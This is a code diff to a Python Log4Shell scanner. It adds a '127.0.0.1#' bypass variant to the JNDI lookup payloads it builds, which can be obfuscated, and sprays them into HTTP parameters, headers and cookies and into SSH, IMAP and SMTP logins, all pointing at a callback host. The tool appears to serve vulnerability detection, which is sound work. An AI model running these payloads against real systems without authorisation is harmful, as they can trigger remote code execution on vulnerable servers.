@@ -166,8 +166,12 @@ class BaseScanner:
             out.append(obfuscation.replace("[CHAR]", char))
         return "".join(out)
 
-    def create_payload(self, callback_url: str, protocol: str, test_path: str, test_domain: str = None, include_domain: bool = True) -> str:
-        format_str = "${{{jndi}:{protocol}://{target_callback}/{path}}}"
+    def create_payload(
+        self, callback_url: str, protocol: str,
+        test_path: str, test_domain: str = None,
+        include_domain: bool = True, include_bypass: bool = False
+    ) -> str:
+        format_str = "${{{jndi}:{protocol}://{bypass}{target_callback}/{path}}}"
 
         if include_domain:
             target = f"{test_domain}.{callback_url}"
@@ -176,6 +180,7 @@ class BaseScanner:
         return format_str.format(
             jndi=(self._obfuscate_string("jndi") if self.obfuscate_payloads else "jndi"),
             protocol=(self._obfuscate_string(protocol) if self.obfuscate_payloads else protocol),
+            bypass="127.0.0.1#" if include_bypass else "",
             target_callback=target,
             path=test_path
         )
@@ -262,44 +267,45 @@ class HttpScanner(BaseScanner):
 
         for protocol in PROTOCOLS:
             logging.info(f"Testing the {protocol} protocol handler.")
-            payload = self.create_payload(
-                callback_host, protocol,
-                target_path, urlparse(url).netloc,
-                is_domain_in_callback
-            )
-            logging.debug(f"Using payload: {payload}")
-            if injection_type == self.InjectionPointType.GetParam:
-                params = {
-                    "q": payload,
-                    "t": payload.replace("{", r"%7B").replace("}", r"%7D")
-                }
-            else:
-                params = None
-            if injection_type == self.InjectionPointType.PostParam:
-                data = POST_BODY.copy()
-                for key in data.keys():
-                    data[key] = data[key].replace("[PAYLOAD]", payload)
-            else:
-                data = None
-            if injection_type == self.InjectionPointType.Header:
-                headers_to_inject = [
-                    {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
-                ]
-            else:
-                headers_to_inject = [DEFAULT_HEADERS.copy()]
+            for include_bypass in [False, True]:
+                payload = self.create_payload(
+                    callback_host, protocol,
+                    target_path, urlparse(url).netloc,
+                    is_domain_in_callback, include_bypass
+                )
+                logging.debug(f"Using payload: {payload}")
+                if injection_type == self.InjectionPointType.GetParam:
+                    params = {
+                        "q": payload,
+                        "t": payload.replace("{", r"%7B").replace("}", r"%7D")
+                    }
+                else:
+                    params = None
+                if injection_type == self.InjectionPointType.PostParam:
+                    data = POST_BODY.copy()
+                    for key in data.keys():
+                        data[key] = data[key].replace("[PAYLOAD]", payload)
+                else:
+                    data = None
+                if injection_type == self.InjectionPointType.Header:
+                    headers_to_inject = [
+                        {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
+                    ]
+                else:
+                    headers_to_inject = [DEFAULT_HEADERS.copy()]
 
-            for header in headers_to_inject:
-                headers = DEFAULT_HEADERS.copy()
-                headers.update(header)
-                # logging.debug(f"Sending request with headers: {headers}")
-                async with httpx.AsyncClient(
-                    verify=False,
-                    proxies=self.proxy,
-                    follow_redirects=True,
-                    max_redirects=3,
-                    cert=self.path_to_clientcert,
-                ) as client:
-                    await self.send_requests(client, url, headers, params, data)
+                for header in headers_to_inject:
+                    headers = DEFAULT_HEADERS.copy()
+                    headers.update(header)
+                    # logging.debug(f"Sending request with headers: {headers}")
+                    async with httpx.AsyncClient(
+                        verify=False,
+                        proxies=self.proxy,
+                        follow_redirects=True,
+                        max_redirects=3,
+                        cert=self.path_to_clientcert,
+                    ) as client:
+                        await self.send_requests(client, url, headers, params, data)
 
     async def test_all_injection_points(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
         for injection_type in self.InjectionPointType:
@@ -343,25 +349,27 @@ class SshScanner(BaseScanner):
         else:
             hostname = target
             port = 22
-        logging.debug(f"Checking {hostname} on port {port} over SSH.")
+        logging.info(f"Checking {hostname} on port {port} over SSH.")
         for protocol in PROTOCOLS:
-            payload = self.create_payload(
-                callback_domain, protocol,
-                self.get_request_path(use_random_request_path),
-                target,
-                is_domain_in_callback
-            )
-            try:
-                self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
-                self._client.close()
-            except Exception as e:
-                logging.debug(e)
-            if self.path_to_clientcert:
+            for include_bypass in [False, True]:
+                payload = self.create_payload(
+                    callback_domain, protocol,
+                    self.get_request_path(use_random_request_path),
+                    target,
+                    is_domain_in_callback,
+                    include_bypass
+                )
                 try:
-                    self._client.connect(hostname=hostname, port=port, username=payload, key_filename=self.path_to_clientcert, timeout=3, look_for_keys=False, auth_timeout=2)
+                    self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
                     self._client.close()
                 except Exception as e:
                     logging.debug(e)
+                if self.path_to_clientcert:
+                    try:
+                        self._client.connect(hostname=hostname, port=port, username=payload, key_filename=self.path_to_clientcert, timeout=3, look_for_keys=False, auth_timeout=2)
+                        self._client.close()
+                    except Exception as e:
+                        logging.debug(e)
 
 
 class ImapScanner(BaseScanner):
@@ -375,20 +383,22 @@ class ImapScanner(BaseScanner):
         else:
             hostname = target
             port = 993
-        logging.debug(f"Checking {hostname} on port {port} over IMAP.")
+        logging.info(f"Checking {hostname} on port {port} over IMAP.")
         for protocol in PROTOCOLS:
-            payload = self.create_payload(
-                callback_domain, protocol,
-                self.get_request_path(use_random_request_path),
-                target,
-                is_domain_in_callback
-            )
-            try:
-                mailbox = MailBox(hostname, port=port)
-                mailbox.login(payload, payload, initial_folder=payload)
-                mailbox.logout()
-            except Exception as e:
-                logging.debug(e)
+            for include_bypass in [False, True]:
+                payload = self.create_payload(
+                    callback_domain, protocol,
+                    self.get_request_path(use_random_request_path),
+                    target,
+                    is_domain_in_callback,
+                    include_bypass
+                )
+                try:
+                    mailbox = MailBox(hostname, port=port)
+                    mailbox.login(payload, payload, initial_folder=payload)
+                    mailbox.logout()
+                except Exception as e:
+                    logging.debug(e)
 
 
 class SmtpScanner(BaseScanner):
@@ -403,24 +413,26 @@ class SmtpScanner(BaseScanner):
         else:
             hostname = target
             port = 25
-        logging.debug(f"Checking {hostname} on port {port} over SMTP.")
+        logging.info(f"Checking {hostname} on port {port} over SMTP.")
         for protocol in PROTOCOLS:
-            payload = self.create_payload(
-                callback_domain, protocol,
-                self.get_request_path(use_random_request_path),
-                target,
-                is_domain_in_callback
-            )
-            try:
-                with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
-                    smtp.login(payload, payload)
-            except Exception as e:
-                logging.debug(e)
-            try:
-                with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
-                    smtp.sendmail(f"{smtplib.quoteaddr(payload)}@test.com", f"{smtplib.quoteaddr(payload)}@{hostname}", smtplib.quotedata(payload))
-            except Exception as e:
-                logging.debug(e)
+            for include_bypass in [False, True]:
+                payload = self.create_payload(
+                    callback_domain, protocol,
+                    self.get_request_path(use_random_request_path),
+                    target,
+                    is_domain_in_callback,
+                    include_bypass
+                )
+                try:
+                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
+                        smtp.login(payload, payload)
+                except Exception as e:
+                    logging.debug(e)
+                try:
+                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
+                        smtp.sendmail(f"{smtplib.quoteaddr(payload)}@test.com", f"{smtplib.quoteaddr(payload)}@{hostname}", smtplib.quotedata(payload))
+                except Exception as e:
+                    logging.debug(e)
 
 
 def parse_arguments() -> argparse.Namespace:
